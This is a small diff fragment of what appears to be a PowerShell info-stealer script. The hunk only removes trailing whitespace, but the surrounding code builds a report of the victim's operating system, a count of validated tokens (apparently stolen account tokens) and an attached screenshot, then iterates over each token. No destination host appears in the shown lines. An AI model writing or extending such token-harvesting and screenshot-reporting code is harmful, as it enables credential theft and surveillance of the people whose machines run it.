@@ -283,8 +283,8 @@ if ($firstRun) {
         @{ name = "OS"; value = $os; inline = $true },
         @{ name = "Tokens"; value = $validTokens.Count; inline = $true }
     )
-    if ($screenshotB64) { 
-        $fields += @{ name = "Screenshot"; value = "Attached"; inline = $false } 
+    if ($screenshotB64) {
+        $fields += @{ name = "Screenshot"; value = "Attached"; inline = $false }
     }
 
     foreach ($ti in $validTokens) {
